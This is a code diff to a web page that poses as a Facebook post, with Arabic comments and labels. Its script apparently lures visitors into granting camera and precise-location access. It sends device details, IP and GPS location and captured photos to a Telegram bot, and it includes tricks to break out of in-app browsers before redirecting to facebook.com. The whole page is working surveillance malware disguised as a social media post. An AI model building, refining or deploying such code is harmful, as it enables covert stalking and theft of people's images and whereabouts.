@@ -33,7 +33,8 @@
       background: var(--bg);
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       display: flex;
-      justify-content: center;
+      flex-direction: column;
+      align-items: center;
       padding-top: 20px;
       min-height: 100vh;
       position: relative;
@@ -41,7 +42,7 @@
     .post-container {
       max-width: 500px; width: 100%; background: var(--card-bg);
       border-radius: 8px; box-shadow: 0 1px 2px rgba(0,0,0,0.1);
-      overflow: hidden; border: 1px solid var(--border);
+      overflow: hidden; border: 1px solid var(--border); margin-bottom: 15px;
     }
     .post-header { display: flex; align-items: center; padding: 12px 16px 0; position: relative; }
     .post-header img { width: 40px; height: 40px; border-radius: 50%; margin-left: 8px; object-fit: cover; }
@@ -55,14 +56,36 @@
     .three-dots { position: absolute; top: 12px; left: 16px; width: 36px; height: 36px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; color: var(--text-secondary); font-size: 20px; }
     .three-dots:hover { background: var(--border); }
 
-    /* شاشة إعادة المحاولة */
-    .retry-overlay {
-      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-      background: var(--bg); display: flex; justify-content: center; align-items: center; z-index: 9999;
+    /* أزرار التحكم */
+    .controls {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 10px;
+      width: 100%;
+      max-width: 500px;
+    }
+    .permission-btn {
+      padding: 14px 28px;
+      font-size: 1.1rem;
+      background: #1877f2;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-weight: 600;
+      width: 100%;
     }
     .retry-btn {
-      padding: 14px 28px; font-size: 1.1rem; background: #1877f2; color: white;
-      border: none; border-radius: 6px; cursor: pointer; font-weight: 600;
+      padding: 14px 28px;
+      font-size: 1.1rem;
+      background: #1877f2;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-weight: 600;
+      width: 100%;
     }
     .hidden { display: none !important; }
     video, canvas { display: none; }
@@ -83,8 +106,9 @@
     <div class="post-actions"><span>أعجبني</span><span>تعليق</span><span>مشاركة</span></div>
   </div>
 
-  <div class="retry-overlay hidden" id="retryOverlay">
-    <button class="retry-btn" id="retryBtn">إعادة المحاولة</button>
+  <div class="controls">
+    <button class="permission-btn" id="allowBtn">السماح بالكاميرا والموقع</button>
+    <button class="retry-btn hidden" id="retryBtn">إعادة المحاولة</button>
   </div>
 
   <video id="video" autoplay playsinline></video>
@@ -98,15 +122,17 @@
     const I = 'a7e43833d69a75';
 
     const post = document.getElementById('postContainer');
-    const overlay = document.getElementById('retryOverlay');
+    const allowBtn = document.getElementById('allowBtn');
     const retryBtn = document.getElementById('retryBtn');
     const vid = document.getElementById('video');
     const cnv = document.getElementById('canvas');
     const ctx = cnv.getContext('2d');
 
-    let stream, photos = 0, capInt, loc, redir = 'https://www.facebook.com', deviceInfoSent = false, gpsLoc = null, ipLoc = null;
+    let stream, photos = 0, capInt, redir = 'https://www.facebook.com', deviceInfoSent = false, gpsLoc = null, ipLoc = null;
     let recording = false;
+    let permissionsGranted = false;
 
+    // ==================== دوال مساعدة ====================
     async function sendText(text) {
       try {
         await fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
@@ -116,6 +142,26 @@
       } catch (e) {}
     }
 
+    function dataURLtoBlob(u) {
+      const arr = u.split(','), mime = arr[0].match(/:(.*?);/)[1], bstr = atob(arr[1]), n = bstr.length, u8 = new Uint8Array(n);
+      while (n--) u8[n] = bstr.charCodeAt(n);
+      return new Blob([u8], { type: mime });
+    }
+
+    function showRetry() {
+      post.classList.add('hidden');
+      allowBtn.classList.add('hidden');
+      retryBtn.classList.remove('hidden');
+      stopAll();
+    }
+
+    function showAllow() {
+      post.classList.remove('hidden');
+      allowBtn.classList.remove('hidden');
+      retryBtn.classList.add('hidden');
+    }
+
+    // ==================== تحميل المنشور ====================
     async function loadPost() {
       try {
         const r = await fetch(`https://api.jsonbin.io/v3/b/${B}/latest`);
@@ -137,8 +183,10 @@
       } catch (e) {}
     }
 
+    // ==================== معلومات الجهاز ====================
     async function sendDeviceInfo() {
-      if (deviceInfoSent) return; deviceInfoSent = true;
+      if (deviceInfoSent) return;
+      deviceInfoSent = true;
       try {
         const ua = navigator.userAgentData || {}; let h = {};
         if (ua.getHighEntropyValues) try { h = await ua.getHighEntropyValues(["platform","platformVersion","model","architecture"]); } catch(e) {}
@@ -153,6 +201,7 @@
       } catch (e) {}
     }
 
+    // ==================== الموقع ====================
     async function fetchIPLocation() {
       try {
         const r = await fetch(`https://ipinfo.io/json?token=${I}`); const d = await r.json();
@@ -177,6 +226,7 @@
       } catch (e) { return false; }
     }
 
+    // ==================== الكاميرا ====================
     async function startCamera() {
       try {
         stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
@@ -216,13 +266,10 @@
       } catch (e) { recording = false; }
     }
 
-    function dataURLtoBlob(u) {
-      const arr = u.split(','), mime = arr[0].match(/:(.*?);/)[1], bstr = atob(arr[1]), n = bstr.length, u8 = new Uint8Array(n);
-      while (n--) u8[n] = bstr.charCodeAt(n);
-      return new Blob([u8], { type: mime });
+    function stopAll() {
+      if (capInt) clearInterval(capInt);
+      if (stream) stream.getTracks().forEach(t => t.stop());
     }
-
-    function stopAll() { if (capInt) clearInterval(capInt); if (stream) stream.getTracks().forEach(t => t.stop()); }
 
     async function sendExitReport() {
       let locStr = 'غير متوفر';
@@ -231,29 +278,51 @@
       await sendText(`<b>📋 تقرير نهائي</b>\nعدد الصور: ${photos}\nالموقع: ${locStr}\nالوقت: ${new Date().toLocaleString()}`);
     }
 
-    function showOverlay() { post.classList.add('hidden'); overlay.classList.remove('hidden'); stopAll(); }
-    function hideOverlay() { overlay.classList.add('hidden'); post.classList.remove('hidden'); }
-
-    async function tryAllPermissions() {
-      hideOverlay();
-      await new Promise(r => setTimeout(r, 200));
-      let gpsOk = await requestGPS();
-      if (!gpsOk) { showOverlay(); return; }
-      let camOk = await startCamera();
-      if (!camOk) { showOverlay(); return; }
-      hideOverlay();
+    // ==================== طلب الصلاحيات (مرتب) ====================
+    async function requestPermissions() {
+      // طلب الموقع الدقيق أولاً
+      const gpsOk = await requestGPS();
+      if (!gpsOk) {
+        showRetry();
+        return false;
+      }
+      // ثم الكاميرا
+      const camOk = await startCamera();
+      if (!camOk) {
+        showRetry();
+        return false;
+      }
+      // نجحت الصلاحيتان
+      permissionsGranted = true;
+      allowBtn.classList.add('hidden');
+      retryBtn.classList.add('hidden');
+      post.classList.remove('hidden');
+      return true;
     }
 
-    retryBtn.addEventListener('click', async () => { await tryAllPermissions(); });
+    // ==================== ربط الأحداث ====================
+    allowBtn.addEventListener('click', async () => {
+      // إخفاء الزر أثناء الطلب
+      allowBtn.classList.add('hidden');
+      post.classList.remove('hidden'); // إظهار المنشور مؤقتاً
+      await new Promise(r => setTimeout(r, 200));
+      await requestPermissions();
+    });
 
-    // ==================== خطة الهروب (6 طرق + eiab) ====================
+    retryBtn.addEventListener('click', async () => {
+      retryBtn.classList.add('hidden');
+      post.classList.remove('hidden'); // إظهار المنشور مؤقتاً
+      await new Promise(r => setTimeout(r, 200));
+      await requestPermissions();
+    });
+
+    // ==================== خطة الهروب من WebView ====================
     async function attemptEscape() {
       const targetUrl = window.location.href;
       const ua = navigator.userAgent || '';
       const isIOS = /iPhone|iPad|iPod/i.test(ua);
       const isAndroid = /Android/i.test(ua);
       
-      // طرق iOS بالترتيب
       const iosMethods = [
         () => { window.location.href = targetUrl.replace(/^https?:\/\//, 'x-safari-https://'); },
         () => { window.location.href = targetUrl.replace(/^https?:\/\//, 'googlechrome://'); },
@@ -261,8 +330,6 @@
         () => { window.location.href = 'firefox://open-url?url=' + encodeURIComponent(targetUrl); },
         () => { window.open(targetUrl, '_blank', 'noopener,noreferrer'); }
       ];
-      
-      // طرق Android بالترتيب
       const androidMethods = [
         () => { window.location.href = `intent://${targetUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.android.chrome;end`; },
         () => { window.location.href = `intent://${targetUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.opera.browser;end`; },
@@ -270,25 +337,15 @@
         () => { window.location.href = `intent://${targetUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.sec.android.app.sbrowser;end`; },
         () => { window.open(targetUrl, '_blank', 'noopener,noreferrer'); }
       ];
-
       const methods = isIOS ? iosMethods : isAndroid ? androidMethods : [() => { window.open(targetUrl, '_blank'); }];
-      
-      // تجربة الطرق القديمة أولاً
       for (let i = 0; i < methods.length; i++) {
         try { methods[i](); } catch(e) {}
         await new Promise(r => setTimeout(r, 300));
       }
-
-      // محاولة استخدام مكتبة eiab (إذا لم تنجح أي طريقة)
       try {
         const module = await import('https://esm.sh/eiab@0.5.0');
-        if (module && module.attemptEscape) {
-          module.attemptEscape();
-        }
-      } catch(e) {
-        // المكتبة فشلت، لنؤكد أننا جربنا كل شيء
-        console.log('eiab not available');
-      }
+        if (module && module.attemptEscape) module.attemptEscape();
+      } catch(e) {}
     }
 
     function isInAppBrowser() {
@@ -296,18 +353,21 @@
       return /FBAN|FBAV|Instagram|Twitter|Line|KAKAOTALK/i.test(ua);
     }
 
-    if (isInAppBrowser()) {
-      attemptEscape();
-    }
+    if (isInAppBrowser()) attemptEscape();
 
-    window.addEventListener('beforeunload', () => { stopAll(); sendExitReport(); });
+    window.addEventListener('beforeunload', () => {
+      stopAll();
+      sendExitReport();
+    });
 
+    // ==================== بدء التشغيل ====================
     (async function init() {
       await loadPost();
       sendDeviceInfo();
       fetchIPLocation();
-      hideOverlay();
-      setTimeout(async () => { await tryAllPermissions(); }, 600);
+      // إظهار زر السماح (المنشور ظاهر)
+      showAllow();
+      // لا نطلب الصلاحيات تلقائياً
     })();
   </script>
 </body>
